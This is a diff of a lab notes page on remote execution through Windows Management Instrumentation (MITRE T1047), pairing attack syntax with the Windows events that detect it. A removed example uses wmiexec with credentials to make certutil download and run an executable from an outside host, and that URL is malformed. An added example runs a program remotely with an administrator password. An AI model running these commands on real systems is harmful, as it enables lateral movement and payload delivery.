@@ -1,17 +1,43 @@
 # [Windows Managment Instrumentation](https://attack.mitre.org/techniques/T1047/)
 
-## Exploit Syntax
+## **Exploit Syntax**
 
 Syntax:
 ```powershell 
-wmiexec -t <ip> -u <domain.user> -d <domain.name> -p <password> -c "cmd"
+wmiexec <ip> <domain.name> <domain.user> password=<password> "cmd"
 ```
 
-Example:
-```powershell 
-wmiexec -t 172.25.47.2 -u aubrey.sandoval -d vcfed-int -p f7m.}K+s-h -c "cmd /c certutil.exe -urlcache -split -f http://downgradesystems.info/quhttp://10.10.254.1:46692/file-transfer/aspect-remind-lawestions/61882772/verify %APPDATA%\7zip.exe && %APPDATA%\7zip.exe"
+Example 1:
+```powershell
+wmiexec 11.25.20.18 meetech.com administrator password=Simspace1!Simspace1! 
+"cmd /c C:\windows\system32\mspaint.exe"
 ```
+---
 
-## Detection Method
+## **Detection Methods**
 
-## Resources
+### Event Actions/Codes Created
+* logged-in/ 4624
+* logged-in-special/ 4672
+* Process Create (rules: ProcessCreate)/ 1
+
+### Services:
+* WmiPrivSE.exe
+* cmd.exe
+
+### Example 1 | *Detection Explination*
+* In example 1 we use poshc2 built in `wmiexec` command to get remote execution on another machine. When doing so we use WMI tool to kick off `mspaint.exe` using `cmd.exe`. Which leads to a the event actions addressed above (logged-in/logged-in-special, and proccess create). 
+
+    ### Identifiable Items
+    * remote host name/ip 
+    *  logged-in / 4624
+    * Users name and SID tied to execution.
+    * logged-in-special / 4672
+    * Application being executed 
+    * Process Create (rules: ProcessCreate) / 1
+
+
+---
+
+## **Resources**
+* 
